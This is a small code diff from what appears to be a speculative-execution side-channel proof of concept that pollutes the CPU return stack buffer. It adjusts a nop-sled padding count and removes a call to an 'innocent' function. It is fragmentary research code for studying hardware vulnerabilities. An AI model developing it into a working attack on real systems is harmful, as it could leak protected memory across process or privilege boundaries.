@@ -42,7 +42,7 @@ char array[256*256];
 
 volatile void spacer() {
 	asm(
-		".rept 2202;"
+		".rept 2215;"
 		"nop;"
 		".endr;"
 	);
@@ -63,7 +63,6 @@ int main(int argc, char *argv[]){
 	}
 	printf("polluting rsb\n");
 	gadget();
-	innocent();
 
 	// string buffer;
 	// char temp;
